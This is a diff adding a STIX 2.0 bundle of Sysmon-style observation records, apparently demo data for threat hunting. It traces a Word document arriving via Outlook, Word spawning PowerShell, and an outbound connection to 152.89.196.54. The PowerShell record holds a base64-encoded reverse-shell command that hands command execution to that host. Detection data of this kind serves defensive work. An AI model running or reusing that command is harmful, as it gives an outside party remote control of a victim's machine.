@@ -1,0 +1,321 @@
+{
+    "type": "bundle",
+    "id": "bundle--25f5ec91-7114-4a21-971d-db65d02c0e2c",
+    "spec_version": "2.0",
+    "objects": [
+        {
+            "type": "identity",
+            "id": "identity--a8c7eb5e-2de5-4e57-9e96-3b1f88bd24dc",
+            "created": "2023-02-10T20:32:56.843Z",
+            "modified": "2023-02-10T20:32:56.843Z",
+            "name": "demo",
+            "identity_class": "program"
+        },
+ 	{
+	    "type": "observed-data",
+	    "id": "observed-data--099e0461-6f82-4ab6-af0f-1b249b2f634a",
+            "created_by_ref": "identity--a8c7eb5e-2de5-4e57-9e96-3b1f88bd24dc",
+            "created": "2023-02-10T20:32:57.382Z",
+            "modified": "2023-02-10T20:32:57.382Z",
+	    "first_observed": "2023-02-10T17:49:04.495Z",
+	    "last_observed": "2023-02-10T17:49:04.495Z",
+	    "number_observed": 1,
+	    "objects": {
+		"0": {
+		    "type": "x-oca-event",
+		    "code": 1,
+		    "action": "File created",
+		    "provider": "Microsoft-Windows-Sysmon/Operational",
+		    "process_ref": "1",
+		    "parent_process_ref": "4",
+		    "user_ref": "7",
+		    "host_ref": "8",
+		    "file_ref": "9"
+		},
+		"1": {
+		    "type": "process",
+		    "name": "outlook.exe",
+		    "binary_ref": "2",
+		    "pid": 13412,
+		    "x_unique_id": "{ef3dcf22-42bc-5f5f-4d00-000000000300}",
+		    "parent_ref": "4",
+		    "creator_user_ref": "7"
+		},
+		"2": {
+		    "type": "file",
+		    "name": "OUTLOOK.EXE",
+		    "parent_directory_ref": "3",
+		    "hashes": {
+			"MD5": "5E6B9FCA30B926586EFD0BFFA963A4BE",
+			"SHA-1": "B47DE31A3EE68461C7CE6E75E8514E5D1BEF9BC1",
+			"SHA-256": "326F909470F562F20F0E66FEFE8C9936C0CF0269D0C87D107120C5E2AC06B9B5"
+		    }
+		},
+		"3": {
+		    "type": "directory",
+		    "path": "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16"
+		},
+		"4": {
+		    "type": "process",
+		    "name": "explorer.exe",
+		    "binary_ref": "5",
+		    "pid": 6164,
+		    "x_unique_id": "{7f07c11c-f5cd-5dcb-0000-00104fbbb400}"
+		},
+		"5": {
+		    "type": "file",
+		    "name": "explorer.exe",
+		    "parent_directory_ref": "6"
+		},
+		"6": {
+		    "type": "directory",
+		    "path": "C:\\Windows"
+		},
+		"7": {
+		    "type": "user-account",
+		    "account_login": "John"
+		},
+		"8": {
+                    "type": "x-oca-asset",
+                    "hostname": "atl008",
+                    "ip_refs": [
+                        "3"
+                    ]
+		},
+		"9": {
+		    "type": "file",
+		    "name": "compensation.docx",
+		    "parent_directory_ref": "10",
+		    "hashes": {
+			"MD5": "244CBE1FB8639076E38F80888947F2DE",
+			"SHA-1": "02C2707D4740C06E1C3B8EBCDEAB6952EB348ACA",
+			"SHA-256": "28D8989B746AE21FEAC6D22CDD6C9B947D75937DA68298B227362E19D219A662"
+		    }
+		},
+		"10": {
+		    "type": "directory",
+		    "path": "C:\\Users\\John\\Documents"
+		}
+	    }
+	},
+ 	{
+	    "type": "observed-data",
+	    "id": "observed-data--8fd3f298-9060-4f7c-b88d-d232a117d90f",
+            "created_by_ref": "identity--a8c7eb5e-2de5-4e57-9e96-3b1f88bd24dc",
+            "created": "2023-02-10T20:32:57.382Z",
+            "modified": "2023-02-10T20:32:57.382Z",
+	    "first_observed": "2023-02-10T17:49:04.495Z",
+	    "last_observed": "2023-02-10T17:49:04.495Z",
+	    "number_observed": 1,
+	    "objects": {
+		"0": {
+		    "type": "x-oca-event",
+		    "code": 1,
+		    "action": "Process Creation",
+		    "provider": "Microsoft-Windows-Sysmon/Operational",
+		    "process_ref": "1",
+		    "parent_process_ref": "4",
+		    "user_ref": "7",
+		    "host_ref": "8"
+		},
+		"1": {
+		    "type": "process",
+		    "name": "winword.exe",
+		    "binary_ref": "2",
+		    "pid": 10468,
+		    "x_unique_id": "{7f07c11c-f2a5-5dcf-0000-00106b796c0d}",
+		    "parent_ref": "4",
+		    "creator_user_ref": "7"
+		},
+		"2": {
+		    "type": "file",
+		    "name": "WINWORD.EXE",
+		    "parent_directory_ref": "3",
+		    "hashes": {
+			"MD5": "10B777CD1CC2D94C60707FB53B29BB7D",
+			"SHA-1": "2FA389B2CFBF11AA5F08609D019F1FD8B1233065",
+			"SHA-256": "75D216CDE89D62AE1F9A8137CE7EE32FEC7A1DA96826BE471E664223651720BC"
+		    }
+		},
+		"3": {
+		    "type": "directory",
+		    "path": "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16"
+		},
+		"4": {
+		    "type": "process",
+		    "name": "explorer.exe",
+		    "binary_ref": "5",
+		    "pid": 6164,
+		    "x_unique_id": "{7f07c11c-f5cd-5dcb-0000-00104fbbb400}"
+		},
+		"5": {
+		    "type": "file",
+		    "name": "explorer.exe",
+		    "parent_directory_ref": "6"
+		},
+		"6": {
+		    "type": "directory",
+		    "path": "C:\\Windows"
+		},
+		"7": {
+		    "type": "user-account",
+		    "account_login": "John"
+		},
+		"8": {
+                    "type": "x-oca-asset",
+                    "hostname": "atl008",
+                    "ip_refs": [
+                        "3"
+                    ]
+		}
+	    }
+	},
+	{
+	    "type": "observed-data",
+	    "id": "observed-data--5c40038b-0dd3-40b8-9290-f106fec66e8e",
+            "created_by_ref": "identity--a8c7eb5e-2de5-4e57-9e96-3b1f88bd24dc",
+            "created": "2023-02-10T20:32:57.382Z",
+            "modified": "2023-02-10T20:32:57.382Z",
+	    "first_observed": "2023-02-10T17:49:34.362Z",
+	    "last_observed": "2023-02-10T17:49:34.362Z",
+	    "number_observed": 1,
+	    "objects": {
+		"0": {
+		    "type": "x-oca-event",
+		    "code": 1,
+		    "action": "Process Creation",
+		    "provider": "Microsoft-Windows-Sysmon/Operational",
+		    "process_ref": "1",
+		    "parent_process_ref": "4",
+		    "user_ref": "7",
+		    "host_ref": "8"
+		},
+		"1": {
+ 		    "type": "process",
+		    "name": "powershell.exe",
+		    "binary_ref": "2",
+		    "parent_ref": "4",
+		    "pid": 11380,
+		    "x_unique_id": "{7f07c11c-c0d7-5dcb-0000-001042920400}",
+		    "command_line": "powershell -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA1ADIALgA4ADkALgAxADkANgAuADUANAAnACwAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAiAC4AIAB7ACAAJABkAGEAdABhACAAfQAgADIAPgAmADEAIgAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA0ACgA="
+		},
+		"2": {
+		    "type": "file",
+		    "name": "powershell.exe",
+		    "hashes":{
+			"MD5": "04029E121A0CFA5991749937DD22A1D9",
+			"SHA-1": "F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054",
+			"SHA-256": "9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F"
+		    },
+		    "parent_directory_ref": "3"
+		},
+		"3": {
+		    "type": "directory",
+		    "path": "C:\\Windows\\system32\\WindowsPowerShell\\v1.0"
+		},
+		"4": {
+		    "type": "process",
+		    "name": "winword.exe",
+		    "binary_ref": "5",
+		    "pid": 10468,
+		    "x_unique_id": "{7f07c11c-f2a5-5dcf-0000-00106b796c0d}"
+		},
+		"5": {
+		    "type": "file",
+		    "name": "WINWORD.EXE",
+		    "parent_directory_ref": "6"
+		},
+		"6": {
+		    "type": "directory",
+		    "path": "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16"
+		},
+		"7": {
+		    "type": "user-account",
+		    "account_login": "John"
+		},
+		"8": {
+                    "type": "x-oca-asset",
+                    "hostname": "atl008",
+                    "ip_refs": [
+                        "3"
+                    ]
+		}
+	    }
+	},
+        {
+            "type": "observed-data",
+            "id": "observed-data--68c7a316-7e2b-4a76-8f1e-5f2a214144a1",
+            "created_by_ref": "identity--a8c7eb5e-2de5-4e57-9e96-3b1f88bd24dc",
+            "created": "2023-02-10T20:32:57.382Z",
+            "modified": "2023-02-10T20:32:57.382Z",
+            "number_observed": 1,
+            "first_observed": "2023-02-10T17:49:35.013Z",
+            "last_observed": "2023-02-10T17:49:35.013Z",
+            "objects": {
+                "0": {
+                    "type": "ipv4-addr",
+                    "value": "152.89.196.54"
+                },
+                "1": {
+                    "type": "network-traffic",
+                    "dst_ref": "0",
+                    "dst_port": 80,
+                    "protocols": [
+                        "ipv4",
+                        "tcp"
+                    ],
+                    "src_ref": "3",
+                    "src_port": 65311
+                },
+                "2": {
+                    "type": "x-oca-asset",
+                    "hostname": "atl008",
+                    "ip_refs": [
+                        "3"
+                    ]
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "192.168.1.108"
+                },
+                "4": {
+                    "type": "user-account",
+                    "account_login": "John"
+                },
+                "5": {
+                    "type": "x-oca-event",
+                    "network_ref": "1",
+                    "host_ref": "2",
+                    "user_ref": "4",
+                    "process_ref": "6",
+                    "ip_refs": [
+                        "0",
+                        "3"
+                    ],
+		    "provider": "Microsoft-Windows-Sysmon/Operational",
+		    "code": 3,
+                    "action": "Network connection"
+                },
+		"6": {
+ 		    "type": "process",
+		    "name": "powershell.exe",
+		    "binary_ref": "7",
+		    "pid": 11380,
+		    "x_unique_id": "{7f07c11c-c0d7-5dcb-0000-001042920400}",
+		    "opened_connection_refs": [
+			"1"
+		    ]
+		},
+		"7": {
+		    "type": "file",
+		    "name": "powershell.exe",
+		    "parent_directory_ref": "8"
+		},
+		"8": {
+		    "type": "directory",
+		    "path": "C:\\Windows\\system32\\WindowsPowerShell\\v1.0"
+		}
+	    }
+        }
+    ]
+}
